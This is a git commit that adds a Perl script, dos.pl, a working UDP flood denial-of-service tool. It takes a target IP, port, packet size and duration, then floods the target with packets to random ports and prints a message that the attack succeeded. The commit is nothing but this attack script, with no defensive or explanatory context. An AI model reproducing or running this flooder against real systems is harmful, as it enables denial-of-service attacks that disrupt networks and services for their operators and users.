c5aeed3e862c194715787dbb7d2062066f5b3703
Kingzmodz <44687713+Kingzmodz@users.noreply.github.com>
2018-11-01 21:44:07 -0400

    Offline...
    Brrrr

---
+++ dos.pl
@@ -0,0 +1,19 @@
+
+use Socket;
+
+my ($ip,$port,$size,$time) = @ARGV;
+
+my ($iaddr,$endtime,$psize,$pport);
+
+$iaddr = inet_aton("$ip") or die "Usage: perl dos.pl <Target> <Port> <Packet Size> <Time>\n";
+$endtime = time() + ($time ? $time : 100);
+socket(flood, PF_INET, SOCK_DGRAM, 17);
+
+print "Successfull Attcking to $ip\n";
+print "Script by By Nxtzq.\n";
+
+for (;time() <= $endtime;) {
+  $psize = $size ? $size : int(rand(1024-64)+64) ;
+  $pport = $port ? $port : int(rand(65500))+1;
+
+  send(flood, pack("a$psize","01010101"), 0, pack_sockaddr_in($pport, $iaddr));}
